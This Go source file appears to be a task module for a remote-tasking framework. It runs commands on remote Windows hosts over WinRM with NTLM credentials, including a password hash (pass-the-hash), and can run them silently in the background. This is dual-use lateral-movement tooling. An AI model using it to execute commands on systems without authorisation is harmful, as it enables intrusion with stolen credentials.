package main

/*
#include <stdlib.h>
*/
import "C"

import (
	"encoding/json"
	"fmt"
	"strconv"
	"winrm/debugger"
)

type WinrmAuthparam struct {
	Username string `json:"username"`
	Password string `json:"password"`
	Hash     string `json:"hash"`
	Domain   string `json:"domain"`
	Command  string `json:"command"`
}

type Task struct {
	TaskId           string `json:"taskid"`
	Host             string `json:"host"`
	Port             string `json:"port"`
	Insecure         string `json:"insecure"`
	TLS              string `json:"tls"`
	AuthType         string `json:"authType"`
	Background       string `json:"background"`
	WinRMPackedParam []byte `json:"winrmPackedParam"`
	// General Purpose
	status   string
	tasktype string
}

func InitialiseTask(task *Task) error {
	task.tasktype = "respwinrm"
	return nil
}

func TaskHandler(task *Task) (stdout []byte, err error) {
	switch task.AuthType {
	case "ntlm":
		var tls bool = false
		var insecure bool = true
		var winrmAuthparm WinrmAuthparam

		err = json.Unmarshal(task.WinRMPackedParam, &winrmAuthparm)
		if err != nil {
			return []byte(err.Error()), err
		}

		portInt, err := strconv.Atoi(task.Port)
		if err != nil {
			return []byte(err.Error()), err
		}

		if task.TLS == "tls" {
			tls = true
		}

		if task.Insecure != "insecure" {
			insecure = false
		}

		if  task.Background == "background" {
			go ExecuteWinrmCommandNTLMUsernamePassword(task.Host, portInt, tls, insecure, winrmAuthparm.Username, winrmAuthparm.Password, winrmAuthparm.Hash, winrmAuthparm.Command)
			stdout = []byte("Run command in background. No output will be printed")
		} else {
			stdout, err = ExecuteWinrmCommandNTLMUsernamePassword(task.Host, portInt, tls, insecure, winrmAuthparm.Username, winrmAuthparm.Password, winrmAuthparm.Hash, winrmAuthparm.Command)

			if err != nil {
				debugger.Println("Error Occured --> ", err.Error())
				task.status = "failed"
				return []byte(err.Error()), err
			}
		}
		task.status = "completed"
		return stdout, nil
	case "kerberos":
		return nil, fmt.Errorf("Auth type kerberos pure not implemented")
	default:
		task.status = "failed"
		return nil, fmt.Errorf("Auth %s type not know", task.AuthType)

	}
}

// Tell us if task if done (failed or completed)
func IsTaskDone(task Task) bool {
	if task.status == "completed" || task.status == "failed" {
		return true
	}
	return false
}

// Return Task Status
func ComputeTaskStatus(task Task) string {
	return task.status
}

// Return Task Type
func ComputeTaskType(task Task) string {
	return task.tasktype
}
